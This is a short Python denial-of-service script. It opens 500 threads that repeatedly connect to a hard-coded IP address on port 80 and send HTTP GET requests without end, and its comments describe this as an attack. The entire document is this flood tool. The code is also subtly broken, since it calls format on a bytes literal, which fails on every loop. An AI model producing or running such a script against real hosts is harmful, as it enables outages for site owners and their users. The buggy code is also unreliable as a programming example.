import socket
import threading

# Target information
target_ip = '138.68.79.95'  # Your server's IP address
target_port = 80  # HTTP port, change if needed
threads = 500  # Number of concurrent requests

# Function to perform the attack
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # Sending a simple HTTP request
            s.sendto(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip).encode('ascii'), (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

# Running the attack in multiple threads
for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
